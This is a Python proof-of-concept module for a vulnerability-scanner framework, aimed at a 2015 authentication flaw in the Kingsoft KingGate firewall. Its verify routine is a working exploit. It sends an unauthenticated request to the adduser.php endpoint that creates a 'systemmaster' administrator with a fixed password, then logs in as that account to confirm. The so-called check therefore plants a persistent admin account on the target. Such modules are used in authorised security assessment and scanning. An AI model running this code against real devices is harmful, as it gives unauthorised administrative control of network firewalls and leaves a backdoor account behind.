# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'KingSoft_0001'  # 平台漏洞编号，留空
    name = '金山KingGate防火墙 获取权限'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-08-19'  # 漏洞公布时间
    desc = '''
        金山旗下"KingGate"硬件防火墙产品（新版）存在设计缺陷无需登录情况下可任意添加管理员。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0135128'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金山软件'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '62827609-acc4-4eef-ac4d-3d1499540ad4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # info:http://www.wooyun.org/bugs/wooyun-2010-0135128
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/src/system/adduser.php'
            code, head, res, errcode, _ = hh.http(url)
            pos1 = head.find("PHPSESSID=") + 10
            pos2 = head.find(";", pos1)
            session_id = head[pos1:pos2]
            if 'systemmaster' in res:
                postdata = "name=scanforvul&password=123qwe123&repassword=123qwe123&enable=&profile=systemmaster¤tpage=1&command=add&data=%0D%0A%5B%0D%0A%7B%22name%22%3A%22scanforvul%22%2C%22password%22%3A%22123qwe123%22%2C%22repassword%22%3A%22123qwe123%22%2C%22enable%22%3A%22yes%22%2C%22profile%22%3A%22systemmaster%22%7D%0D%0A%5D%0D%0A&movename="
                code, head, res, errcode, _ = hh.http(url, post=postdata)
                url = arg + '/src/system/login.php'
                postdata = "session_id=%s&IG_user=scanforvul&IG_passwd=123qwe123&submit1=" % session_id
                code, head, res, errcode, _ = hh.http(url, post=postdata)
                if code == 302 and 'Location:' in head:
                    # security_hole("金山KingGate新版网关防火墙添加管理员:http://www.wooyun.org/bugs/wooyun-2010-0135128")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
